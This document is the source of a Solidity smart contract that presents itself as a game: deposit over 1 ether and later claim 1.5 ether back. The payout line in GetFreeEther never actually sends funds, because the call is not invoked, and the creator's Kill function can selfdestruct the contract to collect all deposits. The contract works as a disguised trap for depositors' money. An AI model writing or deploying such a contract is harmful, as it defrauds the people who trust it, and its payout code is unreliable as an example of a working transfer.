pragma solidity ^0.4.19;

contract QUICK_DEPOSIT_FOR_FUN    
{
    address creator = msg.sender;
    uint256 public LastExtractTime;
    mapping (address=&gt;uint256) public ExtractDepositTime;
    uint256 public freeEther;
    
    function Deposit()
    public
    payable
    {
        if(msg.value&gt; 1 ether &amp;&amp; freeEther &gt;= 0.5 ether)
        {
            LastExtractTime = now + 1 days;
            ExtractDepositTime[msg.sender] = LastExtractTime;
            freeEther-=0.5 ether;
        }
    }
    
    function GetFreeEther()
    public
    payable
    {
        if(ExtractDepositTime[msg.sender]!=0 &amp;&amp; ExtractDepositTime[msg.sender]&lt;now)
        {
            msg.sender.call.value(1.5 ether);
            ExtractDepositTime[msg.sender] = 0;
        }
    }
    
    function PutFreeEther()
    public
    payable
    {
        uint256 newVal = freeEther+msg.value;
        if(newVal&gt;freeEther)freeEther=newVal;
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==creator &amp;&amp; now&gt;LastExtractTime + 2 days)
        {
            selfdestruct(creator);
        }
        else revert();
    }
    
    function() public payable{}
}